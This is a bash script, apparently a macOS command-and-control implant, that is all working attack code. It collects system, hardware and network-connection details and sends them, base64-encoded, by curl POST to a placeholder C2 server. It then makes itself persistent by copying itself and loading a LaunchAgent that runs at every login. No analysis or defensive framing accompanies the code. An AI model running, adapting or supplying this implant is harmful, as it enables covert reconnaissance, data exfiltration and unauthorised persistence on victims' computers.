#!/bin/bash

C2Server="https://your-c2-server.com"
AgentID=3634e277-b79b-4f54-8450-ded00f953cee

encrypt_data() {
    local data="$1"
    echo "$data" | base64
}

decrypt_data() {
    local data="$1"
    echo "$data" | base64 --decode
}

write_log() {
    local message="$1"
    echo "$message"
}

send_data() {
    local endpoint="$1"
    local data="$2"
    local encrypted_data
    encrypted_data=$(encrypt_data "$data")
    curl -k -X POST "$C2Server/$endpoint" -d "$encrypted_data" -H "Content-Type: application/json"
}

gather_system_info() {
    uname -a > /tmp/sysinfo.txt
    sw_vers >> /tmp/sysinfo.txt
    system_profiler SPHardwareDataType >> /tmp/sysinfo.txt
    cat /tmp/sysinfo.txt
}

list_network_connections() {
    netstat -an > /tmp/netstat.txt
    cat /tmp/netstat.txt
}

establish_persistence() {
    local plist_path="$HOME/Library/LaunchAgents/com.macos.payload.plist"
    cat <<EOF > $plist_path
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.macos.payload</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/bash</string>
        <string>$HOME/macos_payload.sh</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
EOF
    cp "$0" "$HOME/macos_payload.sh"
    launchctl load -w $plist_path
}

main() {
    write_log "Payload started. ID: $AgentID"
    
    system_info=$(gather_system_info)
    network_connections=$(list_network_connections)
    
    data=$(cat <<EOF
{
    "AgentID": "$AgentID",
    "SystemInfo": "$system_info",
    "NetworkConnections": "$network_connections"
}
EOF
)
    
    send_data "report" "$data"
    establish_persistence
}

main
